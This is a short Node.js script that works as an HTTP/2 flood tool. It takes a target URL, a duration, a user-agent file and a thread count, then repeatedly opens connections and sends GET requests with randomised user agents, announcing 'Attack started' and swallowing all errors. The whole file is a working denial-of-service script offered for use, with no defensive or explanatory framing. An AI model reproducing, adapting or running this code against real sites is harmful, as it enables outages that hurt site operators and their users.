const http2 = require("http2");
const url = require("url");
const chalk = require("chalk");
const EventEmitter = require('events');
const fs = require('fs');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;


if(process.argv.length != 6)
{
    console.log(chalk.red(`Wrong Usage!`));
    console.log(chalk.yellow(`Usage: node HTTP-REQUEST.js [URL] [TIME] [UA-FILE] [THREADS]`));
    process.exit(3162);
}

var target = process.argv[2];
var time = process.argv[3];
var useragentFile = process.argv[4];
var threads = process.argv[5];
var targetPathname = url.parse(target).path;

const userAgents = fs.readFileSync(useragentFile, 'utf-8').replace(/\r/g, '').split('\n');

console.log(chalk.green(`Attack started on ${target} for ${time} seconds!`));

var int = setInterval(() => {
    for (var i = 0; i < threads; i++) {
        const client = http2.connect(target);
        const req = client.request({
            ":method": "GET",
            ":path": targetPathname,
            "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)]
        });  
    }
});
setTimeout(() => process.exit(0), time * 1000);
process.on('uncaughtException', function (err) { });
process.on('unhandledRejection', function (err) { });